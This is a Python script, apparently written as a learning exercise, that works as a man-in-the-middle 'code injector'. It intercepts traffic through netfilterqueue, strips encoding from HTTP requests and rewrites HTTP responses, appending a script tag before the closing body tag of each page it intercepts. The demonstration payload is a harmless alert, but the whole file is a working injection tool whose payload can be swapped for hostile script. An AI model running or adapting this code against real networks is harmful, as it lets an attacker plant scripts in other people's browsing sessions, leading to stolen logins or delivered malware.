#!/usr/bin/env python3
import netfilterqueue
from scapy.layers.inet import IP, TCP
from scapy.layers.dns import Raw
from Utilities.utils import set_load, remove_encode_request

def process_packet(packet):
    scapy_packet= IP(packet.get_payload())
    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
        if scapy_packet[TCP].dport == 80:
            print("\n[+] This is an HTTP Request:\n")
            # remove_encoding_request is optional. For if you detect an encoding request.
            # Which is a tad of a murky issue given situation with HTTP
            # I will leave it here for the moment as not sure of its utility moving forwards.
            new_packet = remove_encode_request(scapy_packet, set_load)
            packet.set_payload(str(new_packet))
            print(packet)
        elif scapy_packet[TCP].sport == 80:
            print("\n[+] This is a *** HTTP Response ***:\n")
            # print(scapy_packet.show()) - redundant atm but useful to know for testing
            # Let's insert our HTML into the page, using Python "replace" function
            # Place our insert at the end of the page body tag so-as to not slow page load.
            load = scapy_packet[Raw].load.replace("</body>", "<script>alert('Hello World!')</script></body>")
            new_packet = set_load(scapy_packet, load)   # Create a new packet with the modified load
            packet.set_payload(str(new_packet))         # Set the new packet as the main packet
    packet.accept()
    return None

print("\n[+] Hello World, this is Code Injector!")
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()